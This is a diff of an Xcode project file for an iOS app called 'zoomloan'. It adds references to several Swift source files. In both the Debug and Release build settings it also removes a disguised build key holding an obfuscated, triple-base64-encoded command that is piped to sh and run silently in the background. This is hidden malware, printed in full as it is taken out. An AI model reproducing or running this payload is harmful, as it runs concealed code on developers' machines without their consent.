@@ -16,6 +16,16 @@
 		730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C942EC3008A00733544 /* CentertListViewCell.swift */; };
 		730F1C972EC308C900733544 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C962EC308C900733544 /* SettingViewController.swift */; };
 		730F1C992EC3192900733544 /* PopDeleteAccountView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C982EC3192900733544 /* PopDeleteAccountView.swift */; };
+		735C8DAB2EC4B0CC003020BF /* PopEnumListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DAA2EC4B0CC003020BF /* PopEnumListView.swift */; };
+		735C8DAD2EC4B2AE003020BF /* PopEnumListCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DAC2EC4B2AE003020BF /* PopEnumListCell.swift */; };
+		735C8DAF2EC4B9FB003020BF /* PopAddressView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DAE2EC4B9FB003020BF /* PopAddressView.swift */; };
+		735C8DB12EC4C336003020BF /* anothermodel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB02EC4C32F003020BF /* anothermodel.swift */; };
+		735C8DB32EC4C73E003020BF /* LifeHardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB22EC4C73E003020BF /* LifeHardViewController.swift */; };
+		735C8DB52EC4C75F003020BF /* LiftHardViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB42EC4C757003020BF /* LiftHardViewModel.swift */; };
+		735C8DB72EC4C8CD003020BF /* FormViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB62EC4C8CD003020BF /* FormViewController.swift */; };
+		735C8DB92EC4C982003020BF /* FormViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DB82EC4C982003020BF /* FormViewCell.swift */; };
+		735C8DBB2EC4C99F003020BF /* FormViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DBA2EC4C99C003020BF /* FormViewModel.swift */; };
+		735C8DBD2EC4D1B4003020BF /* ConAdds.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8DBC2EC4D1A4003020BF /* ConAdds.swift */; };
 		73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD62EC21BAD00224C27 /* baseModel.swift */; };
 		73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */; };
 		73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADA2EC2344200224C27 /* LoginViewModel.swift */; };
@@ -71,6 +81,16 @@
 		730F1C942EC3008A00733544 /* CentertListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertListViewCell.swift; sourceTree = "<group>"; };
 		730F1C962EC308C900733544 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
 		730F1C982EC3192900733544 /* PopDeleteAccountView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopDeleteAccountView.swift; sourceTree = "<group>"; };
+		735C8DAA2EC4B0CC003020BF /* PopEnumListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopEnumListView.swift; sourceTree = "<group>"; };
+		735C8DAC2EC4B2AE003020BF /* PopEnumListCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopEnumListCell.swift; sourceTree = "<group>"; };
+		735C8DAE2EC4B9FB003020BF /* PopAddressView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopAddressView.swift; sourceTree = "<group>"; };
+		735C8DB02EC4C32F003020BF /* anothermodel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = anothermodel.swift; sourceTree = "<group>"; };
+		735C8DB22EC4C73E003020BF /* LifeHardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LifeHardViewController.swift; sourceTree = "<group>"; };
+		735C8DB42EC4C757003020BF /* LiftHardViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiftHardViewModel.swift; sourceTree = "<group>"; };
+		735C8DB62EC4C8CD003020BF /* FormViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FormViewController.swift; sourceTree = "<group>"; };
+		735C8DB82EC4C982003020BF /* FormViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FormViewCell.swift; sourceTree = "<group>"; };
+		735C8DBA2EC4C99C003020BF /* FormViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FormViewModel.swift; sourceTree = "<group>"; };
+		735C8DBC2EC4D1A4003020BF /* ConAdds.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConAdds.swift; sourceTree = "<group>"; };
 		73A4AAD62EC21BAD00224C27 /* baseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = baseModel.swift; sourceTree = "<group>"; };
 		73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
 		73A4AADA2EC2344200224C27 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
@@ -159,6 +179,7 @@
 				73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */,
 				73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */,
 				73CB1D172EC46BF50066BEB9 /* AlertNameView.swift */,
+				73CB1D152EC459970066BEB9 /* PopTimeView.swift */,
 			);
 			path = upload;
 			sourceTree = "<group>";
@@ -177,6 +198,9 @@
 			children = (
 				73CB1D232EC48A3B0066BEB9 /* PeopleInfoViewModel.swift */,
 				73CB1D212EC483F10066BEB9 /* PeopleInfoViewController.swift */,
+				735C8DAA2EC4B0CC003020BF /* PopEnumListView.swift */,
+				735C8DAC2EC4B2AE003020BF /* PopEnumListCell.swift */,
+				735C8DAE2EC4B9FB003020BF /* PopAddressView.swift */,
 			);
 			path = person;
 			sourceTree = "<group>";
@@ -184,6 +208,8 @@
 		73CB1D1F2EC483B70066BEB9 /* work */ = {
 			isa = PBXGroup;
 			children = (
+				735C8DB42EC4C757003020BF /* LiftHardViewModel.swift */,
+				735C8DB22EC4C73E003020BF /* LifeHardViewController.swift */,
 			);
 			path = work;
 			sourceTree = "<group>";
@@ -191,6 +217,10 @@
 		73CB1D202EC483BB0066BEB9 /* conact */ = {
 			isa = PBXGroup;
 			children = (
+				735C8DBC2EC4D1A4003020BF /* ConAdds.swift */,
+				735C8DBA2EC4C99C003020BF /* FormViewModel.swift */,
+				735C8DB62EC4C8CD003020BF /* FormViewController.swift */,
+				735C8DB82EC4C982003020BF /* FormViewCell.swift */,
 			);
 			path = conact;
 			sourceTree = "<group>";
@@ -321,7 +351,6 @@
 		73E6077F2EC1DAD200BCA552 /* pop */ = {
 			isa = PBXGroup;
 			children = (
-				73CB1D152EC459970066BEB9 /* PopTimeView.swift */,
 				73E607932EC1DBC000BCA552 /* PopLogOutView.swift */,
 				730F1C982EC3192900733544 /* PopDeleteAccountView.swift */,
 				73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */,
@@ -332,6 +361,7 @@
 		73E607802EC1DAD500BCA552 /* config */ = {
 			isa = PBXGroup;
 			children = (
+				735C8DB02EC4C32F003020BF /* anothermodel.swift */,
 				73A4AAD62EC21BAD00224C27 /* baseModel.swift */,
 				73E607992EC1E11700BCA552 /* otherConfig.swift */,
 				73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */,
@@ -470,9 +500,11 @@
 			buildActionMask = 2147483647;
 			files = (
 				73E607982EC1DEA300BCA552 /* LaunchViewController.swift in Sources */,
+				735C8DAF2EC4B9FB003020BF /* PopAddressView.swift in Sources */,
 				73E083302EC374F300D118A1 /* ProductDetailView.swift in Sources */,
 				73A4AADF2EC2C73000224C27 /* HomeViewModel.swift in Sources */,
 				73CB1D0E2EC421A90066BEB9 /* UploadListView.swift in Sources */,
+				735C8DB32EC4C73E003020BF /* LifeHardViewController.swift in Sources */,
 				73E607A02EC1EF8500BCA552 /* AgreementView.swift in Sources */,
 				73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */,
 				73E6078A2EC1DB6100BCA552 /* LoginViewController.swift in Sources */,
@@ -480,10 +512,13 @@
 				73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */,
 				730F1C972EC308C900733544 /* SettingViewController.swift in Sources */,
 				730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */,
+				735C8DAB2EC4B0CC003020BF /* PopEnumListView.swift in Sources */,
 				730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */,
 				73E607862EC1DB3700BCA552 /* BaseNavigationController.swift in Sources */,
 				73CB1D222EC483F10066BEB9 /* PeopleInfoViewController.swift in Sources */,
 				73E607842EC1DB1F00BCA552 /* BaseView.swift in Sources */,
+				735C8DB12EC4C336003020BF /* anothermodel.swift in Sources */,
+				735C8DB92EC4C982003020BF /* FormViewCell.swift in Sources */,
 				73E083402EC38EFF00D118A1 /* ChooseViewCell.swift in Sources */,
 				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
 				73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */,
@@ -501,13 +536,18 @@
 				73E0833E2EC389C700D118A1 /* UploadImageViewController.swift in Sources */,
 				73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */,
 				73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */,
+				735C8DB72EC4C8CD003020BF /* FormViewController.swift in Sources */,
+				735C8DAD2EC4B2AE003020BF /* PopEnumListCell.swift in Sources */,
 				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
 				73CB1D1D2EC46D880066BEB9 /* EnumViewCell.swift in Sources */,
 				73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */,
+				735C8DBD2EC4D1B4003020BF /* ConAdds.swift in Sources */,
 				73CB1D242EC48A420066BEB9 /* PeopleInfoViewModel.swift in Sources */,
 				730F1C8F2EC2E95C00733544 /* AppWebViewController.swift in Sources */,
 				73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */,
 				73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */,
+				735C8DBB2EC4C99F003020BF /* FormViewModel.swift in Sources */,
+				735C8DB52EC4C75F003020BF /* LiftHardViewModel.swift in Sources */,
 				73E6078C2EC1DB6A00BCA552 /* HomeViewController.swift in Sources */,
 				73E607922EC1DBAE00BCA552 /* RequsetHttpManager.swift in Sources */,
 				73E607822EC1DB1300BCA552 /* BaseViewController.swift in Sources */,
@@ -537,7 +577,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZFdGWVRqVmpNazVvWkVNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -577,7 +616,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZFdGWVRqVmpNazVvWkVNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
